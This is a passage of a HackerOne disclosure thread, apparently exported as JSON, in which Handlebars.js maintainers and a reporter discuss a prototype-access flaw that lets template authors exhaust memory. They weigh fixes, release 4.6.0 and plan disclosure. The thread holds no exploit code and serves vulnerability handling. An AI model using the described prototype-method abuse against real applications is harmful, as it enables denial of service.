this is serious and it is a re-incarnation of other issues that have occured due to the possibility of prototype access.\u003cbr\u003e\nI tried to be cautious forbidding prototype access completely because of backwards compatibility issues. A fix of this particular issue should not be too difficult at the moment. We are attempting a more complete fix in version 5.0\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-13T20:00:36.639Z","updated_at":"2019-12-13T20:00:36.639Z","actor":{"username":"knappi79","cleared":false,"url":"/knappi79","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6544505,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@knappi79 thanks for joining and asserting this. I'd like to add that if you are working on a security fix it would be great if it can be addressed with a non-major release please (or at least provide backports for older versions) to make sure consumption of the fix is easy for users in the ecosystem.","markdown_message":"\u003cp\u003e\u003ca href=\"/knappi79\"\u003e@knappi79\u003c/a\u003e thanks for joining and asserting this. I\u0026#39;d like to add that if you are working on a security fix it would be great if it can be addressed with a non-major release please (or at least provide backports for older versions) to make sure consumption of the fix is easy for users in the ecosystem.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-13T20:06:58.390Z","updated_at":"2019-12-13T20:06:58.390Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6545146,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The question to ask if it a security issue is: Who can exploit it. If a template author can exploit it to achieve something that only a developer or admin could to otherwise, then it is serious.\n\nVariant 1 definetely is. I am not sure about Variant 2.\n\nI have to admit that memory exhaustion hasn't come to my mind when thinking about security issues...","markdown_message":"\u003cp\u003eThe question to ask if it a security issue is: Who can exploit it. If a template author can exploit it to achieve something that only a developer or admin could to otherwise, then it is serious.\u003c/p\u003e\n\n\u003cp\u003eVariant 1 definetely is. I am not sure about Variant 2.\u003c/p\u003e\n\n\u003cp\u003eI have to admit that memory exhaustion hasn\u0026#39;t come to my mind when thinking about security issues...\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-13T20:17:52.711Z","updated_at":"2019-12-13T20:17:52.711Z","actor":{"username":"knappi79","cleared":false,"url":"/knappi79","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6545173,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"To put this into perspective, we have had security reports before for projects which receive a JSON schema and specifically call out that the library treats the JSON schema as an untrusted source and it is the sole responsibility of the developer to sanitize or confirm the security integrity of the schema before using it and the library itself is waved off from doing that. This is why I haven't jumped straight up on the red alert button to call this off as a security vulnerability.\n\nContext and intent is essential, especially for libraries where the API and sources for it are borderline and it is ultimately (in most cases like this) up to the library maintainer to set these guidelines.\n\n\n","markdown_message":"\u003cp\u003eTo put this into perspective, we have had security reports before for projects which receive a JSON schema and specifically call out that the library treats the JSON schema as an untrusted source and it is the sole responsibility of the developer to sanitize or confirm the security integrity of the schema before using it and the library itself is waved off from doing that. This is why I haven\u0026#39;t jumped straight up on the red alert button to call this off as a security vulnerability.\u003c/p\u003e\n\n\u003cp\u003eContext and intent is essential, especially for libraries where the API and sources for it are borderline and it is ultimately (in most cases like this) up to the library maintainer to set these guidelines.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-13T20:23:29.242Z","updated_at":"2019-12-13T20:23:29.242Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6545201,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"There is a list of dangerous-properties here : https://github.com/wycats/handlebars.js/blob/master/lib/handlebars/helpers/lookup.js\n\nThat list is used by the lookup-helper and the compiler (because only fixing it in the compiler would allow the author to circumvent it). It adds a check whether the property is enumerable before allowing to access it.\n\nWe could add the more properties to the list. Or we could finally implement a whitelist and disallow access to all other properties.\nI would like to invite Hannah Wolfe and Yehuda Katz from the Handlebars team to discuss this. Is that OK?\n\n","markdown_message":"\u003cp\u003eThere is a list of dangerous-properties here : \u003ca title=\"https://github.com/wycats/handlebars.js/blob/master/lib/handlebars/helpers/lookup.js\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fwycats%2Fhandlebars.js%2Fblob%2Fmaster%2Flib%2Fhandlebars%2Fhelpers%2Flookup.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/wycats/handlebars.js/blob/master/lib/handlebars/helpers/lookup.js\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThat list is used by the lookup-helper and the compiler (because only fixing it in the compiler would allow the author to circumvent it). It adds a check whether the property is enumerable before allowing to access it.\u003c/p\u003e\n\n\u003cp\u003eWe could add the more properties to the list. Or we could finally implement a whitelist and disallow access to all other properties.\u003cbr\u003e\nI would like to invite Hannah Wolfe and Yehuda Katz from the Handlebars team to discuss this. Is that OK?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-13T20:30:59.775Z","updated_at":"2019-12-13T20:30:59.775Z","actor":{"username":"knappi79","cleared":false,"url":"/knappi79","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6545246,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I think I cannot invite them myself. @lirantal can you do that?","markdown_message":"\u003cp\u003eI think I cannot invite them myself. \u003ca href=\"/lirantal\"\u003e@lirantal\u003c/a\u003e can you do that?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-13T20:41:12.498Z","updated_at":"2019-12-13T20:41:12.498Z","actor":{"username":"knappi79","cleared":false,"url":"/knappi79","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6545276,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@knappi79 yes if you can email me their addresses I'm happy to invite.","markdown_message":"\u003cp\u003e\u003ca href=\"/knappi79\"\u003e@knappi79\u003c/a\u003e yes if you can email me their addresses I\u0026#39;m happy to invite.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-13T20:49:04.055Z","updated_at":"2019-12-13T20:49:04.055Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6545403,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The more I think about it: I have been concernced with security issues like that for a long time now. I have been very cautious up to now, not to break backwards compatibility and only to put little patches over the holes that are really critical. But it does not seem to help.\n\n* possible fix 1: Prohibit access to all prototype properties (i.e. add a \"hasOwnProperty\" check in \"nameLookup\" in the compiler and to the \"lookup\"-helper. This would also resolve [#1628](https://github.com/wycats/handlebars.js/issues/1628) which is not a security issue, but nevertheless... This\nmustache is doing the same thing, btw.\nWe should to this in 4.x and, see if anybody complains and then add properties to a whitelist instead of a blacklist.\n\n* possible fix 2: Prohibit access to all prototype properties that are functions. (slightly less strict). This whould not resolve 1628, but it would still make it impossible to call any unwanted functions.\n\n* possible fix 3: Prohibit access to all prototype properties and add a whitelist of properties that may be accessed if they are not functions (i.e. Array.prototype.length)\n\nIn all cases, we should throw an error instead of silently returning \"undefined\", to give the user a clear feedback of what went wrong.\n\n","markdown_message":"\u003cp\u003eThe more I think about it: I have been concernced with security issues like that for a long time now. I have been very cautious up to now, not to break backwards compatibility and only to put little patches over the holes that are really critical. But it does not seem to help.\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003cp\u003epossible fix 1: Prohibit access to all prototype properties (i.e. add a \u0026quot;hasOwnProperty\u0026quot; check in \u0026quot;nameLookup\u0026quot; in the compiler and to the \u0026quot;lookup\u0026quot;-helper. This would also resolve \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fwycats%2Fhandlebars.js%2Fissues%2F1628\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e#1628\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e which is not a security issue, but nevertheless... This\u003cbr\u003e\nmustache is doing the same thing, btw.\u003cbr\u003e\nWe should to this in 4.x and, see if anybody complains and then add properties to a whitelist instead of a blacklist.\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003epossible fix 2: Prohibit access to all prototype properties that are functions. (slightly less strict). This whould not resolve 1628, but it would still make it impossible to call any unwanted functions.\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003epossible fix 3: Prohibit access to all prototype properties and add a whitelist of properties that may be accessed if they are not functions (i.e. Array.prototype.length)\u003c/p\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eIn all cases, we should throw an error instead of silently returning \u0026quot;undefined\u0026quot;, to give the user a clear feedback of what went wrong.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-13T21:15:02.604Z","updated_at":"2019-12-13T21:15:02.604Z","actor":{"username":"knappi79","cleared":false,"url":"/knappi79","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6546840,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-14T07:33:20.602Z","updated_at":"2019-12-14T07:33:20.602Z","actor":{"username":"hannahwolfe","cleared":false,"url":"/hannahwolfe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6553519,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Actually @knappi79, with regards to the first reference you mentioned on the public issue here https://github.com/wycats/handlebars.js/issues/1628 - are you sure this couldn't turn into a prototype pollution vulnerability?\n\nAnyway, back to the problem stated in this issue - I'm not sure how exactly you would stop a malicious user in control of the template, from consuming all available memory. \n","markdown_message":"\u003cp\u003eActually \u003ca href=\"/knappi79\"\u003e@knappi79\u003c/a\u003e, with regards to the first reference you mentioned on the public issue here \u003ca title=\"https://github.com/wycats/handlebars.js/issues/1628\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fwycats%2Fhandlebars.js%2Fissues%2F1628\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/wycats/handlebars.js/issues/1628\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e - are you sure this couldn\u0026#39;t turn into a prototype pollution vulnerability?\u003c/p\u003e\n\n\u003cp\u003eAnyway, back to the problem stated in this issue - I\u0026#39;m not sure how exactly you would stop a malicious user in control of the template, from consuming all available memory. \u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-15T23:31:15.082Z","updated_at":"2019-12-15T23:31:15.082Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6561867,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"If access to prototype-properties is prohibited, then the template author cannot call \"push\", \"repeat\" without registering a herlper. Of course  you can still upload a template that is 2GB large, but it would be the responsibility of the application to prevent that.\n\nI don't know if there are any other ways to pollute the prototype. We already fobid \"constructor\", \"__defineSetter__\", \"__defineGetter__\" etc., if they are not enumerable, to prevent prototype pollution that has happened earlier this year.\n\n","markdown_message":"\u003cp\u003eIf access to prototype-properties is prohibited, then the template author cannot call \u0026quot;push\u0026quot;, \u0026quot;repeat\u0026quot; without registering a herlper. Of course  you can still upload a template that is 2GB large, but it would be the responsibility of the application to prevent that.\u003c/p\u003e\n\n\u003cp\u003eI don\u0026#39;t know if there are any other ways to pollute the prototype. We already fobid \u0026quot;constructor\u0026quot;, \u0026quot;\u003cstrong\u003edefineSetter\u003c/strong\u003e\u0026quot;, \u0026quot;\u003cstrong\u003edefineGetter\u003c/strong\u003e\u0026quot; etc., if they are not enumerable, to prevent prototype pollution that has happened earlier this year.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-16T19:11:07.976Z","updated_at":"2019-12-16T19:11:07.976Z","actor":{"username":"knappi79","cleared":false,"url":"/knappi79","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6595865,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Short update: I have a fix ready, but it needs to be reviewed before merging. I'll let you know when we are done.\n\n@lirantal The fix is rather generic (forbid access to all prototype properties and methods). I don't think that the exploits can be derived from the commit and it also fixes #1628. Would you say it is save to do the review in public?\n\nThe other thing is: We are technically publishing a breaking change in a minor-version increment. Although the odds of breaking should be small, the possibility is still there. I wonder if we should wait until after the holidays to allow developer to react to the change quickly. Opinions?","markdown_message":"\u003cp\u003eShort update: I have a fix ready, but it needs to be reviewed before merging. I\u0026#39;ll let you know when we are done.\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/lirantal\"\u003e@lirantal\u003c/a\u003e The fix is rather generic (forbid access to all prototype properties and methods). I don\u0026#39;t think that the exploits can be derived from the commit and it also fixes \u003ca href=\"/reports/1628\"\u003e#1628\u003c/a\u003e. Would you say it is save to do the review in public?\u003c/p\u003e\n\n\u003cp\u003eThe other thing is: We are technically publishing a breaking change in a minor-version increment. Although the odds of breaking should be small, the possibility is still there. I wonder if we should wait until after the holidays to allow developer to react to the change quickly. Opinions?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-20T10:22:53.195Z","updated_at":"2019-12-20T10:22:53.195Z","actor":{"username":"knappi79","cleared":false,"url":"/knappi79","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6598066,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@knappi79 you could add a boolean flag to enable this fix, as you did with missing helpers and `allowCallsToHelperMissing` flag. By default the new flag will be true (allow access to prototype functions) - so existing templates won't be broken and developers will have possibility to close a security issue in the case of attack. In the next major release the flag will be false by default (forbid access to prototype functions).","markdown_message":"\u003cp\u003e\u003ca href=\"/knappi79\"\u003e@knappi79\u003c/a\u003e you could add a boolean flag to enable this fix, as you did with missing helpers and \u003ccode\u003eallowCallsToHelperMissing\u003c/code\u003e flag. By default the new flag will be true (allow access to prototype functions) - so existing templates won\u0026#39;t be broken and developers will have possibility to close a security issue in the case of attack. In the next major release the flag will be false by default (forbid access to prototype functions).\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-20T15:47:59.045Z","updated_at":"2019-12-20T15:47:59.045Z","actor":{"username":"macasun","cleared":false,"url":"/macasun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iCmYFpL1XoWHiQKcBiZ21XZ2/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6601303,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, I could do that and we have discussed this internally already. The reason we don't want to do that is:\n\nOn the one hand, it might be considered a breaking change, but if you are using Handlebars as it was intended to use (with plain JSON objects), that change isn't breaking. You *can* use instances of custom classes as input, you *can* use \"Date\"-objects and call prototype-methods. But none of those use-cases was ever mentioned in the documentation or in the unit tests (except for one that I added myself this year when I made the first changes to the prototype-treatment. Since semantic-versioning is always based on a documented API or spec, we can argue that it isn't breaking. But I always fear that a few people out there that determine API through trial-and-error and those people might use Handlebars in a non-intended way.\n\nOn the other hand, if we do release the next 4.x with the fix disabled, people probably won't even notice it and they won't activate it. When the exploit is published, there will still be thousands of vulnerable installations out there.\n\nI am convinced that it is better to have slight chance of a semantic versioning violation than an open, known vulnerability.\n\n","markdown_message":"\u003cp\u003eYes, I could do that and we have discussed this internally already. The reason we don\u0026#39;t want to do that is:\u003c/p\u003e\n\n\u003cp\u003eOn the one hand, it might be considered a breaking change, but if you are using Handlebars as it was intended to use (with plain JSON objects), that change isn\u0026#39;t breaking. You \u003cem\u003ecan\u003c/em\u003e use instances of custom classes as input, you \u003cem\u003ecan\u003c/em\u003e use \u0026quot;Date\u0026quot;-objects and call prototype-methods. But none of those use-cases was ever mentioned in the documentation or in the unit tests (except for one that I added myself this year when I made the first changes to the prototype-treatment. Since semantic-versioning is always based on a documented API or spec, we can argue that it isn\u0026#39;t breaking. But I always fear that a few people out there that determine API through trial-and-error and those people might use Handlebars in a non-intended way.\u003c/p\u003e\n\n\u003cp\u003eOn the other hand, if we do release the next 4.x with the fix disabled, people probably won\u0026#39;t even notice it and they won\u0026#39;t activate it. When the exploit is published, there will still be thousands of vulnerable installations out there.\u003c/p\u003e\n\n\u003cp\u003eI am convinced that it is better to have slight chance of a semantic versioning violation than an open, known vulnerability.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-21T07:26:08.908Z","updated_at":"2019-12-21T07:26:08.908Z","actor":{"username":"knappi79","cleared":false,"url":"/knappi79","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6609357,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@knappi79 seems like you intend to disallow access to methods like `repeat` and `push` then? that's why I asked, because it wasn't clear to me that you will and I thought you might have wanted to just limit each of those memory consumption or something. I guess I didn't realize that prohibiting methods like `repeat` and friends would be an option because that could very much be a breaking change for end-users, no? (perhaps unavoidable though)\n\nAlso:\n- I agree about making the change after the holidays to not disrupt people's lives too much if @amac is ok with it too.\n- Making the change public is to some extend ok if unavoidable. I'd warrant that generally speaking there could be automated bots tracking this kind of activity too. If we're able to make the public change in proximity to when the actual release will take place then that's better to not have them too far out.\n\n@knappi79 about the version change and semantic releases - I will point out that if a use's only way to update for a security fix is via possibly breaking APIs then that's not the ideal behaviour, especially as these days there are many auto upgrade bots. That said, from what you are saying, it is either going to need someone to turn on a flag, or upgrade to a major version, but either way it will end up being a breaking change for them. Is that correct? if so, I'm ok with your original thought of the release process.\n\n\n","markdown_message":"\u003cp\u003e\u003ca href=\"/knappi79\"\u003e@knappi79\u003c/a\u003e seems like you intend to disallow access to methods like \u003ccode\u003erepeat\u003c/code\u003e and \u003ccode\u003epush\u003c/code\u003e then? that\u0026#39;s why I asked, because it wasn\u0026#39;t clear to me that you will and I thought you might have wanted to just limit each of those memory consumption or something. I guess I didn\u0026#39;t realize that prohibiting methods like \u003ccode\u003erepeat\u003c/code\u003e and friends would be an option because that could very much be a breaking change for end-users, no? (perhaps unavoidable though)\u003c/p\u003e\n\n\u003cp\u003eAlso:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eI agree about making the change after the holidays to not disrupt people\u0026#39;s lives too much if \u003ca href=\"/amac\"\u003e@amac\u003c/a\u003e is ok with it too.\u003c/li\u003e\n\u003cli\u003eMaking the change public is to some extend ok if unavoidable. I\u0026#39;d warrant that generally speaking there could be automated bots tracking this kind of activity too. If we\u0026#39;re able to make the public change in proximity to when the actual release will take place then that\u0026#39;s better to not have them too far out.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003e\u003ca href=\"/knappi79\"\u003e@knappi79\u003c/a\u003e about the version change and semantic releases - I will point out that if a use\u0026#39;s only way to update for a security fix is via possibly breaking APIs then that\u0026#39;s not the ideal behaviour, especially as these days there are many auto upgrade bots. That said, from what you are saying, it is either going to need someone to turn on a flag, or upgrade to a major version, but either way it will end up being a breaking change for them. Is that correct? if so, I\u0026#39;m ok with your original thought of the release process.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-22T22:32:02.410Z","updated_at":"2019-12-22T22:32:02.410Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6730387,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I have released 4.6.0 yesterday with the fix in place (see https://github.com/wycats/handlebars.js/pull/1633).\n\nThe change isn't actually breaking if you use Handlebars as documented. All the examples in the documentation are using JSON-like inputs. But people also do trial and error, like the TypeDoc project. We may have to revert the change, but I'll try to talk to them first.\n\nMaybe an opt-out is OK for them.","markdown_message":"\u003cp\u003eI have released 4.6.0 yesterday with the fix in place (see \u003ca title=\"https://github.com/wycats/handlebars.js/pull/1633\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fwycats%2Fhandlebars.js%2Fpull%2F1633\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/wycats/handlebars.js/pull/1633\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e).\u003c/p\u003e\n\n\u003cp\u003eThe change isn\u0026#39;t actually breaking if you use Handlebars as documented. All the examples in the documentation are using JSON-like inputs. But people also do trial and error, like the TypeDoc project. We may have to revert the change, but I\u0026#39;ll try to talk to them first.\u003c/p\u003e\n\n\u003cp\u003eMaybe an opt-out is OK for them.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-09T20:00:14.239Z","updated_at":"2020-01-09T20:00:14.239Z","actor":{"username":"knappi79","cleared":false,"url":"/knappi79","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6735370,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks @knappi79 🎉\n@amac can you please confirm the fix is working as expected?","markdown_message":"\u003cp\u003eThanks \u003ca href=\"/knappi79\"\u003e@knappi79\u003c/a\u003e 🎉\u003cbr\u003e\n\u003ca href=\"/amac\"\u003e@amac\u003c/a\u003e can you please confirm the fix is working as expected?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-10T11:33:25.394Z","updated_at":"2020-01-10T11:33:25.394Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6735515,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @lirantal,\nYes, I confirm that the fix works. Good work @knappi79.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/lirantal\"\u003e@lirantal\u003c/a\u003e,\u003cbr\u003e\nYes, I confirm that the fix works. Good work \u003ca href=\"/knappi79\"\u003e@knappi79\u003c/a\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-10T11:55:03.656Z","updated_at":"2020-01-10T11:55:03.656Z","actor":{"username":"macasun","cleared":false,"url":"/macasun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iCmYFpL1XoWHiQKcBiZ21XZ2/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6737816,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks. It would be good if somebody reported this issue to npm-security at https://www.npmjs.com/advisories/report?package=handlebars\n\nThe other vulnerability are also tracked there and they are automatically checked.\n\n@amac could you do that (it would also get your name as reporter).\n\nBTW @amac, if you are planning to publish details about this issue yourself, I would ask you to wait a couple of weeks to give users a chance to adapt first. And please send me a link if you do so. I will link it in the handlebars-issues.\n\nIs there an official policy on hackerone for disclosure timelines?\n","markdown_message":"\u003cp\u003eThanks. It would be good if somebody reported this issue to npm-security at \u003ca title=\"https://www.npmjs.com/advisories/report?package=handlebars\" href=\"/redirect?url=https%3A%2F%2Fwww.npmjs.com%2Fadvisories%2Freport%3Fpackage%3Dhandlebars\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.npmjs.com/advisories/report?package=handlebars\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe other vulnerability are also tracked there and they are automatically checked.\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/amac\"\u003e@amac\u003c/a\u003e could you do that (it would also get your name as reporter).\u003c/p\u003e\n\n\u003cp\u003eBTW \u003ca href=\"/amac\"\u003e@amac\u003c/a\u003e, if you are planning to publish details about this issue yourself, I would ask you to wait a couple of weeks to give users a chance to adapt first. And please send me a link if you do so. I will link it in the handlebars-issues.\u003c/p\u003e\n\n\u003cp\u003eIs there an official policy on hackerone for disclosure timelines?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-10T16:48:26.050Z","updated_at":"2020-01-10T16:48:26.050Z","actor":{"username":"knappi79","cleared":false,"url":"/knappi79","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6743808,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@knappi79 so actually:\n- disclosure guidelines are at: https://github.com/nodejs/security-wg/blob/master/processes/third_party_vuln_process.md and I'll request disclosure which should only be actively disclosed after a reasonable time to allow users to upgrade indeed to fixed versions\n- npmjs as well as others like snyk track the H1 feed and get their updates through that, although by all means you are also welcome to directly contact them, however you should note not to make them re-triage and re-contact you for this issue because already have all the details here.\n\nsounds ok?","markdown_message":"\u003cp\u003e\u003ca href=\"/knappi79\"\u003e@knappi79\u003c/a\u003e so actually:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003edisclosure guidelines are at: \u003ca title=\"https://github.com/nodejs/security-wg/blob/master/processes/third_party_vuln_process.md\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fnodejs%2Fsecurity-wg%2Fblob%2Fmaster%2Fprocesses%2Fthird_party_vuln_process.md\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/nodejs/security-wg/blob/master/processes/third_party_vuln_process.md\u003c/span\u003e\u003ci 